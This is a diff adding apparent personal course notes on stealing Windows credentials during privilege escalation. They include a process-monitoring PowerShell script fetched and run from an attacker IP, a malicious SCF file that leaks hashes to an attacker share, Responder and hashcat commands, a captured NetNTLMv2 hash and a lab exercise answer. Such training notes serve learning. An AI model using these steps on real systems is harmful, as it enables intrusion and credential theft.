@@ -2,3 +2,64 @@
 Users are *usually* the weakest link in an organization. An overloaded employee working quickly may not notice something is "off" on their machine when browsing a shared drive, clicking on a link, or running a file. As discussed throughout this module, Windows presents us with an enormous attack surface, and there are many things to check for when enumerating local privilege escalation vectors. Once we have exhausted all options, we can look at specific techniques to steal credentials from an unsuspecting user by sniffing their network traffic/local commands or attacking a known vulnerable service requiring user interaction. One of my favorite techniques is placing malicious files around heavily accessed file shares in an attempt to retrieve user password hashes to crack offline later.
 
 Can use TCPDUMP or wireshark to catch and look through traffic - !*!*!* THIS TOOK net-creds (https://github.com/DanMcInerney/net-creds) can run and sniff passwords and hashes from packet captures, its a good idea to let it run during an assessment. 
+
+
+Monitoring for Process Command Lines
+When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
+
+Monitor Script: 
+
+while($true)
+{
+
+  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Start-Sleep 1
+  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+  Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+}
+
+
+Running Monitor Script on Target Host
+We can host the script on our attack machine and execute it on the target host as follows.
+
+
+
+PS SYNTAX: PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 
+
+InputObject                                           SideIndicator
+-----------                                           -------------
+@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
+@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
+@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
+@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
+@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
+
+
+Malicious SCF File 
+
+[Shell]
+Command=2
+IconFile=\\10.10.15.125\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+
+
+sccm_svc::WINLPE-SRV01:1bc8141f28c9fe1e:034B93DA07DF34EA0125540D800BA305:010100000000000000B3FBCBC582DB01BE7F51CB0123905F00000000020008004F0054005000300001001E00570049004E002D0058004200590033003400510041005A0051004300460004003400570049004E002D0058004200590033003400510041005A005100430046002E004F005400500030002E004C004F00430041004C00030014004F005400500030002E004C004F00430041004C00050014004F005400500030002E004C004F00430041004C000700080000B3FBCBC582DB0106000400020000000800300030000000000000000100000000200000BF91D26F12E09CD867462456972D5299F8994B9A3411EF2AFDA469721AD063690A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310032003500000000000000000000000000
+
+
+
+Question 1 - Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user. - Password1 
+1) xfreerdp in 
+2) hint tells us to find writable share 
+3) look at properties in the c:\Department shares\Public 
+4) turns out its IT 
+5) place this into a rich text file to start -> [Shell]
+Command=2
+IconFile=\\10.10.15.125\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+6) on KALI MACHINE start responder with - sudo responder -v -I tun0 -w 
+7) wait for hash -> sccm_svc::WINLPE-SRV01:1bc8141f28c9fe1e:034B93DA07DF34EA0125540D800BA305:010100000000000000B3FBCBC582DB01BE7F51CB0123905F00000000020008004F0054005000300001001E00570049004E002D0058004200590033003400510041005A0051004300460004003400570049004E002D0058004200590033003400510041005A005100430046002E004F005400500030002E004C004F00430041004C00030014004F005400500030002E004C004F00430041004C00050014004F005400500030002E004C004F00430041004C000700080000B3FBCBC582DB0106000400020000000800300030000000000000000100000000200000BF91D26F12E09CD867462456972D5299F8994B9A3411EF2AFDA469721AD063690A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310032003500000000000000000000000000
+8) put into document on host machine 
+9) hashcat -m 5600 svhash /usr/share/wordlists/rockyou.txt -> cracked = Password1 
